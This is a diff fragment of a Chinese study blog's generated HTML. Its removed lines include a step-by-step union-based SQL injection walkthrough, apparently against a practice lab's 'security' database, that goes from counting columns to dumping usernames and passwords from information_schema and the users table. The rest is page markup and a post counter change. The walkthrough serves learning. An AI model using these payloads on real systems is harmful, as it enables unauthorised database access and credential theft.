-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure>
-
-<p>3.输入 <code>?id=-1&#39; union select 1,2,3, --+</code></p>
-<p>4,爆数据库（得到数据库名称security）<code>?id=-1&#39; union select 2,3, database() --+</code></p>
-<p>5,爆表名（得到表名users）<code>?id=-1&#39; union select 2,3,group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39; --+</code></p>
-<p>6.爆列名（得到列名username，password…）<code>?id=-1&#39; union select 2,3, group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
-<p>7.查询内容 <code>?id=-1 union select 2,3, group_concat (username, &#39;:&#39;,password)from security.users --+</code></p>
-<p>2021 11 19 </p>
-<p>在实验室学习的一天</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/11/16/mysql%20%E7%9A%84%E5%87%BD%E6%95%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="微风">
-      <meta itemprop="description" content="微风的学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Breeze">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/16/mysql%20%E7%9A%84%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-11-16 23:15:58 / 修改时间：23:15:59" itemprop="dateCreated datePublished" datetime="2021-11-16T23:15:58+08:00">2021-11-16</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><img src="https://i.loli.net/2021/11/16/pTwogVcQKPFzJti.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -929,7 +954,7 @@ class选择器 ，表现形式： .class名 &#123;属性：值&#125; ，ps：使
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
